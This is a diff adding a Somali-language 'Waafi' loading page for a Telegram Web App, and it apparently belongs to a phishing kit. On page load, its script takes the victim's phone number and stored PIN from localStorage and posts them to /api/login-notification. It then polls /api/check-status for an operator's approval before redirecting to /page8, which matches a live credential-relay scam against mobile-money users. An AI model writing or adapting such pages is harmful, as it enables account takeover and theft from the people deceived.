@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Waafi - Diyaarinta</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, sans-serif;
+            background-color: #7a7a7a;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .loading-card {
+            background: white;
+            width: 90%;
+            max-width: 380px;
+            padding: 50px 20px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        .loader-circle {
+            width: 120px;
+            height: 120px;
+            background: radial-gradient(circle, #a3e635 0%, #82d13d 100%);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loader-circle::after {
+            content: '';
+            width: 90px;
+            height: 90px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 {
+            color: #82d13d;
+            font-size: 28px;
+            margin: 0 0 10px;
+        }
+
+        p {
+            color: #555;
+            font-size: 16px;
+            margin: 0;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text">Habaynta...</h2>
+    <p id="sub-text">Diyaarinaya xaqiijinta...</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
+
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    const phone = localStorage.getItem("phone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
+
+    if (!phone) {
+        console.warn("⚠️ No phone found in localStorage");
+    }
+
+    // -------------------- SEND LOGIN REQUEST --------------------
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin })
+        });
+    } catch (err) {
+        console.error("❌ Fetch Error:", err);
+    }
+
+    // -------------------- TEXT CHANGE --------------------
+    setTimeout(() => {
+        mainText.textContent = "Fadlan sug...";
+        subText.textContent = "Tani waxay qaadataa dhowr ilbiriqsi";
+    }, 3000);
+
+    // -------------------- CHECK APPROVAL --------------------
+    async function checkApproval() {
+        if (!phone) return;
+
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
+
+            if (data.status === "approved") {
+                mainText.textContent = "La ansixiyay!";
+                subText.textContent = "Bogga xiga ayaa kuu furmaya...";
+
+                setTimeout(() => {
+                    window.location.href = "/page8";
+                }, 1500);
+            }
+
+            if (data.status === "denied") {
+                mainText.textContent = "La diiday!";
+                subText.textContent = "Xogtaada waa khalad.";
+            }
+
+        } catch (err) {
+            console.error("❌ Status check failed:", err);
+        }
+    }
+
+    setInterval(checkApproval, 2000);
+});
+</script>
+
+</body>
+</html>
